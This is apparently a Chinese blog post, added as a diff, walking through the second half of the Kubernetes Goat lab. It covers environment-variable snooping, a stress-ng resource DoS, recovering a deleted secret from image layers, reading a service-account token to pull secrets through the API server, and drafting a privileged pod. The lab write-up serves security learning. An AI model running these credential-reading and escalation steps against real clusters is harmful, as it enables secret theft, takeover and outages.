@@ -1,0 +1,1536 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="X2n" />
+
+  <!-- 搜索引擎摘要：优先页面自定义 description / excerpt / 正文前 160 字，最后回落到站点 description -->
+  
+  
+    <meta name="description" content="前言 k8s goat靶场下半部分。 十一、Gaining environment information 这与传统工作负载并无二致。大多数计算实例在运行应用程序时，会将敏感信息（例如密钥、API 密钥等）存储在环境变量中。同样，在 Kubernetes 中，大多数用户也会将敏感信息（例如 Kubernetes Sec…" />
+  
+  
+    <meta name="keywords" content="X2n,Web安全,漏洞挖掘,渗透测试,SRC,内网渗透,Kubernetes 安全,云安全,安全研究,技术博客" />
+  
+
+  
+  
+  <title>
+    
+      k8s-goat靶场练习-下 
+      
+      
+      |
+    
+     Keep your passion for what you love !
+  </title>
+
+  
+
+  <!-- Canonical URL：避免重复内容降权 -->
+  <link rel="canonical" href="https://x2nn.github.io/2026/04/04/k8s-goat靶场练习-下/" />
+
+  <!-- Open Graph (Facebook / 微信 / 飞书 / LinkedIn) -->
+  <meta property="og:site_name" content="Keep your passion for what you love !" />
+  <meta property="og:title" content="k8s-goat靶场练习-下 | Keep your passion for what you love !" />
+  
+    <meta property="og:description" content="前言 k8s goat靶场下半部分。 十一、Gaining environment information 这与传统工作负载并无二致。大多数计算实例在运行应用程序时，会将敏感信息（例如密钥、API 密钥等）存储在环境变量中。同样，在 Kubernetes 中，大多数用户也会将敏感信息（例如 Kubernetes Sec…" />
+  
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://x2nn.github.io/2026/04/04/k8s-goat靶场练习-下/" />
+  <meta property="og:image" content="https://x2nn.github.io/images/avatar.png" />
+  <meta property="og:locale" content="zh_CN" />
+  
+    
+      <meta property="article:published_time" content="2026-04-04T08:52:05.000Z" />
+    
+    
+      <meta property="article:modified_time" content="2026-04-21T10:27:25.676Z" />
+    
+    
+      <meta property="article:tag" content="Kubernetes" />
+    
+      <meta property="article:tag" content="容器逃逸" />
+    
+      <meta property="article:tag" content="云安全" />
+    
+  
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="k8s-goat靶场练习-下 | Keep your passion for what you love !" />
+  
+    <meta name="twitter:description" content="前言 k8s goat靶场下半部分。 十一、Gaining environment information 这与传统工作负载并无二致。大多数计算实例在运行应用程序时，会将敏感信息（例如密钥、API 密钥等）存储在环境变量中。同样，在 Kubernetes 中，大多数用户也会将敏感信息（例如 Kubernetes Sec…" />
+  
+  <meta name="twitter:image" content="https://x2nn.github.io/images/avatar.png" />
+
+  <!-- RSS 订阅：浏览器与阅读器可自动发现 -->
+  <link rel="alternate" type="application/atom+xml" title="Keep your passion for what you love ! Atom Feed" href="/atom.xml" />
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+  
+<script src="/js/progressBar.js"></script>
+
+  
+<script src="/js/headerlinkCopy.js"></script>
+
+
+  
+
+  
+
+  <!-- Cloudflare Web Analytics（零 cookie、隐私友好） -->
+  
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js"
+            data-cf-beacon='{"token": "1e1fd0957b6d4ca8a09a54a598b7b525"}'></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="" loading="lazy" decoding="async">
+      
+    </a>
+    <div class="nickname"><a href="/"></a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Category</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/collections/">
+          <a href="/collections/">Collections</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">k8s-goat靶场练习-下</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2026-04-21 18:27:25
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Kubernetes/" title="Kubernetes">
+                    #Kubernetes
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" title="容器逃逸">
+                    #容器逃逸
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" title="云安全">
+                    #云安全
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" title="Web安全">
+                    <b>#</b> Web安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="前言" tabindex="-1"><a class="headerlink" href="#前言" aria-hidden="true"></a> 前言</h2>
+<p>k8s goat靶场下半部分。</p>
+<h2 id="十一、gaining-environment-information" tabindex="-1"><a class="headerlink" href="#十一、gaining-environment-information" aria-hidden="true"></a> 十一、Gaining environment information</h2>
+<p>这与传统工作负载并无二致。大多数计算实例在运行应用程序时，会将敏感信息（例如密钥、API 密钥等）存储在环境变量中。同样，在 Kubernetes 中，大多数用户也会将敏感信息（例如 Kubernetes Secret 和配置值）存储在环境变量中。如果攻击者能够发现应用程序漏洞，例如远程代码执行 (RCE) 或命令注入，那么该密钥就可能泄露。</p>
+<p>通过本情景模拟，我们将理解并学习以下内容：</p>
+<ol>
+<li>
+<p>如何探索环境变量并进行分析</p>
+</li>
+<li>
+<p>获取容器中的敏感信息</p>
+</li>
+</ol>
+<h3 id="获取敏感信息" tabindex="-1"><a class="headerlink" href="#获取敏感信息" aria-hidden="true"></a> 获取敏感信息</h3>
+<p>Kubernetes 中的每个环境都需要共享大量信息。其中一些关键信息包括密钥、API 密钥、配置、服务等等。</p>
+<p>访问URL：<a target="_blank" rel="noopener" href="http://127.0.0.1:1233">http://127.0.0.1:1233</a></p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404203302672.png" alt="image-20260404203302672" loading="lazy" decoding="async"></p>
+<p>我们可以通过运行不同的命令来探索容器，从而更好地了解系统</p>
+<p>我们可以通过运行以下命令来获取容器运行时信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/cgroup</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404203507395.png" alt="image-20260404203507395" loading="lazy" decoding="async"></p>
+<p>我们可以获取容器主机的信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/hosts</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404203605034.png" alt="image-20260404203605034" loading="lazy" decoding="async"></p>
+<p>我们可以获取安装信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404203724107.png" alt="image-20260404203724107" loading="lazy" decoding="async"></p>
+<p>我们还可以查看和探索文件系统。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404203823195.png" alt="image-20260404203823195" loading="lazy" decoding="async"></p>
+<p>我们可以访问环境变量，包括已挂载的 Kubernetes 密钥、服务名称、端口等。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404204849037.png" alt="image-20260404204849037" loading="lazy" decoding="async"></p>
+<h2 id="十二、dos-the-memorycpu-resources" tabindex="-1"><a class="headerlink" href="#十二、dos-the-memorycpu-resources" aria-hidden="true"></a> 十二、DoS the Memory/CPU resources</h2>
+<p>可用性是 CIA 三元组之一。Kubernetes 解决的核心问题之一是资源管理，例如自动扩缩容、部署等。在本场景中，我们将看到，如果集群资源（例如内存和 CPU 请求及限制）没有实施资源管理配置，攻击者如何利用这些资源来获取更多资源或通过执行拒绝服务 (DoS) 攻击来影响资源可用性。</p>
+<p>通过本情景模拟，我们将理解并学习以下内容：</p>
+<ol>
+<li>学习如何使用 <code>stress-ng</code> 对计算和内存资源执行拒绝服务攻击 (DoS)。</li>
+<li>了解 Kubernetes 对 Pod 和容器的资源管理</li>
+<li>使用指标和信息探索 Kubernetes 资源监控</li>
+</ol>
+<h3 id="发起dos攻击" tabindex="-1"><a class="headerlink" href="#发起dos攻击" aria-hidden="true"></a> 发起DoS攻击</h3>
+<p>访问URL：<a target="_blank" rel="noopener" href="http://127.0.0.1:1236/">http://127.0.0.1:1236/</a></p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404205105744.png" alt="image-20260404205105744" loading="lazy" decoding="async"></p>
+<p>此部署Pod的Kubernetes清单中未设置任何资源限制。因此，我们可以执行一系列可能消耗更多资源的操作。</p>
+<p>先查看一下当前的资源的使用情况</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl --namespace big-monolith top pod hunger-check-deployment-5488f8b86c-qvhzs</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404211642787.png" alt="image-20260404211642787" loading="lazy" decoding="async"></p>
+<p>发现没安装Metrics Server，安装并部署。直接安装失败了，yaml下载到本地，才安装成功。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f ./kubernetes-goat/scenarios/metrics-server/components.yaml</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404211900489.png" alt="image-20260404211900489" loading="lazy" decoding="async"></p>
+<p>先看一下当前的资源消耗的情况。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404212059890.png" alt="image-20260404212059890" loading="lazy" decoding="async"></p>
+<p>可以使用像<code>stress-ng</code>这样的简单工具来执行压力测试，例如访问更多资源。本次，通过消耗2GB内存来访问超出此pod/容器预期范围的资源。以下命令用于访问比指定资源更多的资源。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stress-ng --vm 2 --vm-bytes 2G --<span class="built_in">timeout</span> 30s</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404212205313.png" alt="image-20260404212205313" loading="lazy" decoding="async"></p>
+<p>你可以看到正常资源消耗与运行 <code>stress-ng</code> 时资源消耗的差异，在 stress-ng 运行时，资源消耗远超预期。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404212303197.png" alt="image-20260404212303197" loading="lazy" decoding="async"></p>
+<p>可以看出消耗的资源远超预期，这可能影响资源可用性。</p>
+<h2 id="十三、hacker-container-preview" tabindex="-1"><a class="headerlink" href="#十三、hacker-container-preview" aria-hidden="true"></a> 十三、Hacker container preview</h2>
+<p>在执行和测试容器或 Kubernetes 基础设施时，我们通常需要在容器内安装一些常用工具，以便进行进一步的漏洞利用，之后再将其部署到集群中。Hacker Container 就是一个基于 Alpine 的简单 Docker 容器，其中包含在对容器化和 Kubernetes 集群环境进行安全评估时常用的工具和实用程序。</p>
+<p>通过本情景模拟，我们将理解并学习以下内容：</p>
+<ol>
+<li>如何使用 hacker-tainer 并探索多种常用安全工具和命令</li>
+<li>学习如何使用黑客容器进行枚举、漏洞利用和后渗透攻击</li>
+</ol>
+<h3 id="cdk环境探测" tabindex="-1"><a class="headerlink" href="#cdk环境探测" aria-hidden="true"></a> CDK环境探测</h3>
+<p>安装hacker-container。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh</span><br></pre></td></tr></table></figure>
+<p>个人觉得这个hacker-container中的工具太老旧了，目前比较好的用于云渗透的工具<a target="_blank" rel="noopener" href="https://github.com/cdk-team/CDK">CDK</a>，可以很好的评估云环境的安全性。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/cdk eva</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404223842252.png" alt="image-20260404223842252" loading="lazy" decoding="async"></p>
+<p>还有一些。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404223912111.png" alt="image-20260404223912111" loading="lazy" decoding="async"></p>
+<h2 id="十四、hidden-in-layers" tabindex="-1"><a class="headerlink" href="#十四、hidden-in-layers" aria-hidden="true"></a> 十四、Hidden in layers</h2>
+<p>互联网上下载和使用的大部分容器镜像都是由其他人创建的。如果我们不知道它们是如何创建的（也就是说，如果我们没有 <code>Dockerfile</code> ），那么我们有时可能会遇到麻烦。在这种情况下，我们可以使用内置工具以及一些流行的开源工具（例如 dive）来分析 Docker 容器镜像层，从而更好地理解容器镜像层。</p>
+<p>通过本情景模拟，我们将理解并学习以下内容：</p>
+<ol>
+<li>如何探索、内省和分析 Docker 容器镜像</li>
+<li>使用像 Dive 这样的开源工具进行容器镜像分析</li>
+<li>能够使用标准命令行实用程序</li>
+</ol>
+<h3 id="查找敏感信息" tabindex="-1"><a class="headerlink" href="#查找敏感信息" aria-hidden="true"></a> 查找敏感信息</h3>
+<p>敏感信息泄露是目前最常见的安全漏洞之一。在容器化环境中，密码、私钥、令牌等信息处理不当很容易导致敏感信息泄露。本文将分析并识别一种导致敏感信息泄露的错误做法。</p>
+<p>运行以下命令并探索 <code>hidden-layers</code> 作业。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get <span class="built_in">jobs</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404230625515.png" alt="image-20260404230625515" loading="lazy" decoding="async"></p>
+<p>查找镜像。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404232318650.png" alt="image-20260404232318650" loading="lazy" decoding="async"></p>
+<p>然后使用<a target="_blank" rel="noopener" href="https://github.com/wagoodman/dive">dive</a>，去查看镜像。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dive madhuakula/k8s-goat-hidden-in-layers</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260404232445800.png" alt="image-20260404232445800" loading="lazy" decoding="async"></p>
+<p>从以上分析可以看出， <code>/root/contributions.txt</code> contributions.txt 和 <code>/root/secret.txt</code> 这两个文件发生了显著变化。上述方法无法读取这些文件的内容。让我们看看能否在运行中的容器中找到这些文件。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406193928498.png" alt="image-20260406193928498" loading="lazy" decoding="async"></p>
+<p>我们无法看到 <code>/root/secret.txt</code> ，因为它已被下一层镜像删除。我们可以利用 Docker 内置命令将 Docker 镜像导出为 tar 文件来恢复 <code>/root/secret.txt</code> 文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers.tar</span><br></pre></td></tr></table></figure>
+<p>现在我们有了目标文件，可以提取 tar 文件来探索各个层。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf hidden-in-layers.tar</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406194927078.png" alt="image-20260406194927078" loading="lazy" decoding="async"></p>
+<p>由前面的dive可以知道，secret.txt文件位于 <code>blobs/sha256/aeb19cbfb884f9254a78d91b48306eae800bf7c0288a74f83a62049f4ac14fa2</code>中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -tvf blobs/sha256/aeb19cbfb884f9254a78d91b48306eae800bf7c0288a74f83a62049f4ac14fa2</span><br><span class="line">tar -xOf blobs/sha256/aeb19cbfb884f9254a78d91b48306eae800bf7c0288a74f83a62049f4ac14fa2 root/secret.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406195128081.png" alt="image-20260406195128081" loading="lazy" decoding="async"></p>
+<h2 id="十五、rbac-least-privileges-misconfiguration" tabindex="-1"><a class="headerlink" href="#十五、rbac-least-privileges-misconfiguration" aria-hidden="true"></a> 十五、RBAC least privileges misconfiguration</h2>
+<p>在 Kubernetes 的早期阶段，并没有 RBAC（role-based access control）的概念，它主要使用 ABAC（attribute-based access control）。如今，它拥有了 RBAC 等强大的功能，可以实现最小权限原则的安全保障。然而，大多数实际工作负载和资源最终获得的权限仍然超出了预期。本文将探讨这种简单的配置错误如何导致用户获取密钥、更多资源和信息。</p>
+<p>通过本情景模拟，我们将理解并学习以下内容：</p>
+<ol>
+<li>使用 REST API 访问 Kubernetes API 服务器并与之通信</li>
+<li>使用不同的 Kubernetes 资源并查询它们</li>
+<li>利用配置错误/权限过高的情况来获取敏感信息和资源。</li>
+</ol>
+<h3 id="rbac最低权限配置错误" tabindex="-1"><a class="headerlink" href="#rbac最低权限配置错误" aria-hidden="true"></a> RBAC最低权限配置错误</h3>
+<p>在实际应用中，我们经常看到开发人员和 DevOps 团队授予用户超出实际需求的额外权限。这使得攻击者能够获得超出预期的控制权和权限。在这种情况下，虽然可以利用绑定到 Pod 的服务帐户（service account）来提供 <code>webhookapikey</code> 访问权限，但攻击者也可以利用此权限控制其他密钥和资源。</p>
+<p>访问URL：<a target="_blank" rel="noopener" href="http://127.0.0.1:1236/">http://127.0.0.1:1236</a></p>
+<p>此部署中映射了一个自定义<code>ServiceAccount</code>，该账户分配了过于宽松的策略/权限。作为攻击者，我们可以利用这一点来获取对其他资源和服务的访问权限。</p>
+<p>Kubernetes默认会将所有令牌和服务账户信息存储在默认位置，定位到该位置查找有用的信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/run/secrets/kubernetes.io/serviceaccount/</span><br><span class="line"><span class="built_in">ls</span> -larth</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406213513554.png" alt="image-20260406213513554" loading="lazy" decoding="async"></p>
+<p>现在我们可以使用这些信息，通过可用的权限和特权来查询Kubernetes API服务并与之通信。</p>
+<p>要指向内部API服务器主机名，我们可以将其从环境变量中导出。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> APISERVER=https://<span class="variable">$&#123;KUBERNETES_SERVICE_HOST&#125;</span></span><br></pre></td></tr></table></figure>
+<p>设置<code>ServiceAccount</code>令牌的路径。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount</span><br></pre></td></tr></table></figure>
+<p>设置命名空间值。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> NAMESPACE=$(<span class="built_in">cat</span> <span class="variable">$&#123;SERVICEACCOUNT&#125;</span>/namespace)</span><br></pre></td></tr></table></figure>
+<p>读取<code>ServiceAccount</code>持有者令牌。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> TOKEN=$(<span class="built_in">cat</span> <span class="variable">$&#123;SERVICEACCOUNT&#125;</span>/token)</span><br></pre></td></tr></table></figure>
+<p>指定 <code>ca.crt</code> 路径，以便我们可以在 <code>curl</code> 请求中查询时使用它。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CACERT=<span class="variable">$&#123;SERVICEACCOUNT&#125;</span>/ca.crt</span><br></pre></td></tr></table></figure>
+<p>现在我们可以使用令牌和已构建的查询来探索Kubernetes API。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert <span class="variable">$&#123;CACERT&#125;</span> --header <span class="string">&quot;Authorization: Bearer <span class="variable">$&#123;TOKEN&#125;</span>&quot;</span> -X GET <span class="variable">$&#123;APISERVER&#125;</span>/api</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406214950657.png" alt="image-20260406214950657" loading="lazy" decoding="async"></p>
+<h4 id="查询命名空间的密钥" tabindex="-1"><a class="headerlink" href="#查询命名空间的密钥" aria-hidden="true"></a> 查询命名空间的密钥</h4>
+<p>要查询<code>default</code>命名空间中可用的密钥，运行以下命令。</p>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406215602916.png" alt="image-20260406215602916" loading="lazy" decoding="async"></p>
+<p>要查询特定于命名空间的密钥。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert <span class="variable">$&#123;CACERT&#125;</span> --header <span class="string">&quot;Authorization: Bearer <span class="variable">$&#123;TOKEN&#125;</span>&quot;</span> -X GET <span class="variable">$&#123;APISERVER&#125;</span>/api/v1/namespaces/<span class="variable">$&#123;NAMESPACE&#125;</span>/secrets</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406215957976.png" alt="image-20260406215957976" loading="lazy" decoding="async"></p>
+<h4 id="查询特定命名空间中的pod" tabindex="-1"><a class="headerlink" href="#查询特定命名空间中的pod" aria-hidden="true"></a> 查询特定命名空间中的pod</h4>
+<p>查询特定命名空间中的 Pod</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cacert <span class="variable">$&#123;CACERT&#125;</span> --header <span class="string">&quot;Authorization: Bearer <span class="variable">$&#123;TOKEN&#125;</span>&quot;</span> -X GET <span class="variable">$&#123;APISERVER&#125;</span>/api/v1/namespaces/<span class="variable">$&#123;NAMESPACE&#125;</span>/pods</span><br></pre></td></tr></table></figure>
+<p><img src="/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/image-20260406220141790.png" alt="image-20260406220141790" loading="lazy" decoding="async"></p>
+<h4 id="创建和删除pod" tabindex="-1"><a class="headerlink" href="#创建和删除pod" aria-hidden="true"></a> 创建和删除pod</h4>
+<p>创建特定命名空间中的Pod</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">&#x27;EOF&#x27;</span> &gt; pod.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;apiVersion&quot;</span>: <span class="string">&quot;v1&quot;</span>,</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;Pod&quot;</span>,</span><br><span class="line">  <span class="string">&quot;metadata&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;my-pod&quot;</span>,</span><br><span class="line">    <span class="string">&quot;namespace&quot;</span>: <span class="string">&quot;big-monolith&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;spec&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;containers&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;nginx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;image&quot;</span>: <span class="string">&quot;nginx:1.25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;securityContext&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;privileged&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+<p>然后根据这个pod.json文件进行创建。</p>
